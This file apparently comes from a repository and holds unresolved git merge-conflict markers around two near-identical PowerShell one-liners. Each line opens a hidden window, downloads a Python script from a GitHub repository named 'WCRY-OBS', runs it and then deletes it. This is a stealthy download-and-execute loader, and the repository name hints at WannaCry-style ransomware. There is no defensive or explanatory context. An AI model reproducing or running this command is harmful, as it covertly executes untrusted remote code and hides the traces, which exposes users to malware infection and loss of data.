<<<<<<< HEAD
powershell -windowstyle hidden{$url = 'https://raw.githubusercontent.com/bookbot2019/WCRY-OBS/main/Oshawott.py';Invoke-WebRequest -Uri $url -Outfile "Oshawott.py";python3 Oshawott.py;Remove-Item "Oshawott.py";}
=======
powershell -WindowStyle Hidden{$url = 'http://raw.githubusercontent.com/bookbot2019/WCRY-OBS/main/Oshawott.py';Invoke-Webrequest -Uri $url -Outfile "Oshawott.py";python3 Oshawott.py;Remove-Item "Oshawott.py";}
>>>>>>> c7cb7c19afaa871d135ab383bf90c5f63d94f7db
